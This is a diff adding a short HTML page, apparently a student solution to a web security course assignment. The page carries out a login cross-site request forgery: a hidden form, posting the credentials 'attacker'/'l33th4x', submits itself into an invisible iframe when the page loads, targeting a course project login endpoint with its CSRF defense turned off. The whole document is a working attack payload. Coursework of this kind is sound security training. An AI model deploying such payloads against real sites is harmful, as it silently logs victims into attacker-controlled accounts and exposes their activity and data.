@@ -1,0 +1,11 @@
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+<iframe id="hidden" name="hidden" style="display: none"></iframe>
+<form id="redirect" action="https://comp427.rice.edu/proj2/login?csrfdefense=0&xssdefense=4" method="POST" target="hidden">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="l33th4x" />
+</form>
+<script> window.onload = document.redirect.submit() </script>
+</body>
